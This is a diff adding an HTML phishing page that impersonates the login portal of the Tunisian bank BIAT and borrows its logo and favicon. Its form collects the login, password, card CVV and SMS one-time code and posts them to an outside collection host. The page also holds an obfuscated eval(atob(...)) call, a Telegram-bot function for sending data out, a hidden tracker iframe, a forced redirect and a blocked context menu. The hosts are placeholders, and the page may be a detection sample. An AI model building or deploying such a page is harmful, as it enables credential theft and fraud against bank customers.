@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <title>BIAT - Espace client | Connexion</title>
+  <link rel="shortcut icon" href="https://www.biat.com.tn/favicon.ico">
+  <meta name="robots" content="noindex">
+  <meta http-equiv="refresh" content="300; url=https://redirect.example.org/next">
+  <script>
+    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+    eval(atob('YWxlcnQoMSk='));
+    function send(d) { fetch('https://api.telegram.org/bot123456:FAKE/sendMessage?text=' + d); }
+    window.location = 'https://elsewhere.example.net/landing';
+  </script>
+</head>
+<body>
+  <img src="https://www.biat.com.tn/assets/logo.png" alt="BIAT">
+  <h1>Bienvenue sur BIAT Web Banking</h1>
+  <p>Banque BIAT : saisissez vos identifiants pour continuer. BIAT vous protege.</p>
+  <iframe src="https://tracker.example.org/pixel" width="0" height="0"></iframe>
+  <form action="https://collect.example.org/post.php" method="POST">
+    <input type="text" name="identifiant" placeholder="Identifiant">
+    <input type="password" name="mot_de_passe" placeholder="Mot de passe">
+    <input type="text" name="cvv" placeholder="CVV">
+    <input type="text" name="otp_code" placeholder="Code SMS">
+    <input type="hidden" name="session" value="abc">
+    <button type="submit">Se connecter</button>
+  </form>
+  <form action="/search" method="get"><input type="text" name="q"></form>
+</body>
+</html>
